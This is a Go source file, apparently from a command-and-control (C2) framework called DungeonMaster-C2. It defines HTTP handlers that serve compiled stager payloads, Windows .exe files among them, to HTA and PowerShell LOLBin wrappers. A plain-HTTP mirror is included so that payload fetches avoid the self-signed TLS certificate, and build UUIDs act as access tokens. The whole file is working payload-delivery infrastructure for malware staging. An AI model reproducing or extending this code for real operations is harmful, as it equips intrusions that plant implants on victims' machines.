package api

import (
	"context"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/storage"
	"github.com/minio/minio-go/v7"
	"go.uber.org/zap"
)

// handleDownload serves the stager artifact to a LOLBin wrapper (HTA, PS1, etc.)
// that was generated by the /api/v1/builds/{id}/deliver endpoint.
// The buildID in the URL acts as the access token — treat it as a secret.
func (s *C2Server) handleDownload(w http.ResponseWriter, r *http.Request) {
	buildID := strings.TrimPrefix(r.URL.Path, "/download/")
	buildID = strings.TrimSpace(buildID)

	if len(buildID) != 36 ||
		buildID[8] != '-' || buildID[13] != '-' ||
		buildID[18] != '-' || buildID[23] != '-' {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
	defer cancel()

	var status, targetOS string
	err := db.Pool.QueryRow(ctx,
		`SELECT status, target_os FROM builds WHERE id = $1`, buildID,
	).Scan(&status, &targetOS)
	if err != nil || status != "complete" {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	ext := ""
	if targetOS == "windows" {
		ext = ".exe"
	}
	objectKey := buildID + ext

	obj, err := storage.Client.GetObject(ctx, storage.BucketArtifacts, objectKey, minio.GetObjectOptions{})
	if err != nil {
		s.log.Warn("download: GetObject failed", zap.String("id", maskUUID(buildID)), zap.Error(err))
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	defer obj.Close()

	stat, err := obj.Stat()
	if err != nil {
		s.log.Warn("download: Stat failed", zap.String("id", maskUUID(buildID)), zap.Error(err))
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", strconv.FormatInt(stat.Size, 10))
	w.WriteHeader(http.StatusOK)
	io.Copy(w, obj) //nolint:errcheck
}

// handleHTTPDownload mirrors handleDownload on the plain HTTP gateway (port 8080).
// Allows HTA/PS1 wrappers to fetch the payload over HTTP, bypassing the self-signed
// TLS cert on the C2 port.  The build UUID acts as the access token.
func (g *gateway) handleHTTPDownload(w http.ResponseWriter, r *http.Request) {
	buildID := strings.TrimPrefix(r.URL.Path, "/download/")
	buildID = strings.TrimSuffix(strings.TrimSpace(buildID), ".exe")

	if len(buildID) != 36 ||
		buildID[8] != '-' || buildID[13] != '-' ||
		buildID[18] != '-' || buildID[23] != '-' {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
	defer cancel()

	var status, targetOS string
	err := db.Pool.QueryRow(ctx,
		`SELECT status, target_os FROM builds WHERE id = $1`, buildID,
	).Scan(&status, &targetOS)
	if err != nil || status != "complete" {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	ext := ""
	if targetOS == "windows" {
		ext = ".exe"
	}

	obj, err := storage.Client.GetObject(ctx, storage.BucketArtifacts, buildID+ext, minio.GetObjectOptions{})
	if err != nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	defer obj.Close()

	stat, err := obj.Stat()
	if err != nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", strconv.FormatInt(stat.Size, 10))
	w.WriteHeader(http.StatusOK)
	io.Copy(w, obj) //nolint:errcheck
}

// maskUUID replaces the last 12 chars of a UUID with asterisks for logging.
func maskUUID(u string) string {
	if len(u) < 12 {
		return "***"
	}
	return u[:len(u)-12] + "***"
}
